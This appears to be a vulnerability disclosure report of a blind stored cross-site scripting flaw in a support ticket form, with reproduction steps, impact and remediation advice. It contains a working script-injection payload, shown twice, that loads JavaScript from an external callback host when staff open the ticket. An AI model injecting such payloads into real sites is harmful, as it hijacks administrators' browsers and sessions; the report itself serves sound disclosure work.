# Blind Cross-Site Scripting (Blind XSS) in Support Ticket Functionality

## Summary

I identified a Blind Cross-Site Scripting (Blind XSS) vulnerability in the **Name**, **Subject**, and **Your Message** fields of the Support Ticket functionality.

The application stores user-supplied input from these fields without properly sanitizing or encoding it before rendering it in the support interface. By submitting a malicious payload, arbitrary JavaScript is stored in the application's database and executed when a support agent or administrator views the submitted ticket.

The vulnerability was confirmed by receiving a callback from the XSS monitoring service after the ticket was viewed.

## Vulnerability Type

**Blind Cross-Site Scripting (Blind XSS)**

## Vulnerable Fields

```text
Name
Subject
Your Message
```

## Steps to Reproduce

1. Open the **Support Ticket** page.

2. Enter the following Blind XSS payload into any of the vulnerable fields (**Name**, **Subject**, or **Your Message**):

   ```html
   "><script src=https://xss.report/c/nok1></script>
   ```

3. Complete the remaining required fields and submit the support ticket.

4. Wait for a support agent or administrator to review the submitted ticket.

5. When the ticket is opened in the support panel, the stored payload executes automatically.

6. Observe that a callback is received from the configured XSS monitoring service, confirming successful JavaScript execution.

## Payload Used

```html
"><script src=https://xss.report/c/nok1></script>
```

## Proof of Concept

The supplied payload was successfully stored in the application's database through the vulnerable support ticket fields.

When a support agent or administrator opened the submitted ticket, the injected JavaScript executed automatically and loaded the external script hosted on the configured XSS monitoring service.

The callback confirmed successful execution in the support agent's browser and included information such as the requested URL, user agent, referrer, origin, and other browser details.

A recorded demonstration and the callback details from the XSS monitoring service confirm successful exploitation of the Blind XSS vulnerability.


https://github.com/user-attachments/assets/60182eec-b82e-4b8a-9b07-20c915626b00


## Impact

An attacker can store a malicious payload that executes when a support agent or administrator views the submitted support ticket. This could allow an attacker to execute arbitrary JavaScript in the victim's browser, access sensitive information available to the victim's session, or perform actions on behalf of the affected user.

## Recommendation

To mitigate this vulnerability:

- Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML.
- Validate and sanitize user input before storing it in the database.
- Apply context-aware output encoding whenever stored user input is rendered.
- Deploy a strong Content Security Policy (CSP) to reduce the impact of XSS vulnerabilities.
- Deploy a Web Application Firewall (WAF), such as Cloudflare WAF, to help detect and block malicious XSS payloads.
